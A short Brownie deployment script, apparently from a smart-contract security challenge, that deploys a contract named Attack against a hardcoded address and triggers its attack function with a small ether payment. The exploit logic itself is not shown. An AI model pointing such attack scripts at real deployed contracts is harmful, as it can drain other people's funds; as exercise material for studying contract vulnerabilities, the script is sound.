from scripts.helpful_scripts import get_account
from brownie import Attack


def main():
    account = get_account()
    attack = Attack.deploy(
        "0xA5Ee8C91764ef1caF9dBA077dE985DA3445d0C06", {"from": account}
    )
    print("Attack contract deployed!")
    tx = attack.attack({"value": 100000000000000, "from": account})
    tx.wait(1)
    print("Attack began!")
